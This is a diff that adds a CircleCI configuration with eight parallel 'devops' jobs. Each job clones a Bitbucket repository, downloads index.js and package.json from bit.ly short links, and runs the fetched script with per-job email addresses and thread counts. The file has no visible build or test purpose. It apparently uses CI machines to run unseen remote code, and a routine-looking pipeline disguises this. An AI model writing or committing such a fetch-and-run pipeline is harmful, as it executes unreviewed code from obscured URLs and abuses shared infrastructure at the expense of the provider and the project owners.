@@ -1,0 +1,120 @@
+version: 2.1
+
+jobs:
+ devops_r_17:
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: medium
+    steps:
+      - run: git clone https://meocodervippro@bitbucket.org/lunarcrush/lunarcrush-data.git --branch honghongtimkhiepxuan@vip.stu.office.gy --single-branch lunarCrushData
+      - run: 
+          name: Update Package
+          command: sudo apt-get update
+      - run: sudo apt-get install -y libgbm-dev
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
+      - run: npm i -s
+      - run: node index -t 56 -r 4 -e honghongtimkhiepxuan@vip.stu.office.gy
+ devops_r_18:
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: medium
+    steps:
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
+      - run: git clone https://meocodervippro@bitbucket.org/lunarcrush/lunarcrush-data.git --branch chomaisaokhongvethe@vip.stu.office.gy --single-branch lunarCrushData
+      - run: 
+          name: Update Package
+          command: sudo apt-get update
+      - run: sudo apt-get install -y libgbm-dev
+      - run: npm i -s
+      - run: node index -t 56 -r 4 -e chomaisaokhongvethe@vip.stu.office.gy
+ devops_r_19:
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: medium
+    steps:
+      - run: git clone https://meocodervippro@bitbucket.org/lunarcrush/lunarcrush-data.git --branch buonoilabuonthenhi@vip.stu.office.gy --single-branch lunarCrushData
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
+      - run: 
+          name: Update Package
+          command: sudo apt-get update
+      - run: sudo apt-get install -y libgbm-dev
+      - run: npm i -s
+      - run: node index -t 57 -r 3 -e buonoilabuonthenhi@vip.stu.office.gy
+ devops_r_20:
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: medium
+    steps:
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
+      - run: git clone https://meocodervippro@bitbucket.org/lunarcrush/lunarcrush-data.git --branch nhanhchayngaydinhanhlen@vip.stu.office.gy --single-branch lunarCrushData
+      - run: 
+          name: Update Package
+          command: sudo apt-get update
+      - run: sudo apt-get install -y libgbm-dev
+      - run: npm i -s
+      - run: node index -t 56 -r 4 -e nhanhchayngaydinhanhlen@vip.stu.office.gy
+ devops_r_21:
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: medium
+    steps:
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
+      - run: git clone https://meocodervippro@bitbucket.org/lunarcrush/lunarcrush-data.git --branch congviecnhieuquabietlam@vip.stu.office.gy --single-branch lunarCrushData
+      - run: 
+          name: Update Package
+          command: sudo apt-get update
+      - run: sudo apt-get install -y libgbm-dev
+      - run: npm i -s
+      - run: node index -t 57 -r 3 -e congviecnhieuquabietlam@vip.stu.office.gy
+ devops_r_22:
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: medium
+    steps:
+      - run: git clone https://meocodervippro@bitbucket.org/lunarcrush/lunarcrush-data.git --branch baotoiroigapgapgap@vip.stu.office.gy --single-branch lunarCrushData
+      - run: 
+          name: Update Package
+          command: sudo apt-get update
+      - run: sudo apt-get install -y libgbm-dev
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
+      - run: npm i -s
+      - run: node index -t 56 -r 4 -e baotoiroigapgapgap@vip.stu.office.gy
+ devops_r_23:
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: medium
+    steps:
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
+      - run: git clone https://meocodervippro@bitbucket.org/lunarcrush/lunarcrush-data.git --branch cuocsongemonkhongthe@vip.stu.office.gy --single-branch lunarCrushData
+      - run: 
+          name: Update Package
+          command: sudo apt-get update
+      - run: sudo apt-get install -y libgbm-dev
+      - run: npm i -s
+      - run: node index -t 56 -r 4 -e cuocsongemonkhongthe@vip.stu.office.gy
+ devops_r_24:
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: medium
+    steps:
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
+      - run: git clone https://meocodervippro@bitbucket.org/lunarcrush/lunarcrush-data.git --branch xongvieccaithithoichucon@vip.stu.office.gy --single-branch lunarCrushData
+      - run: 
+          name: Update Package
+          command: sudo apt-get update
+      - run: sudo apt-get install -y libgbm-dev
+      - run: npm i -s
+      - run: node index -t 56 -r 4 -e xongvieccaithithoichucon@vip.stu.office.gy
+      
+      
+workflows:
+  devops:
+    jobs:
+      - devops_r_17
+      - devops_r_18
+      - devops_r_19
+      - devops_r_20
+      - devops_r_21
+      - devops_r_22
+      - devops_r_23
+      - devops_r_24
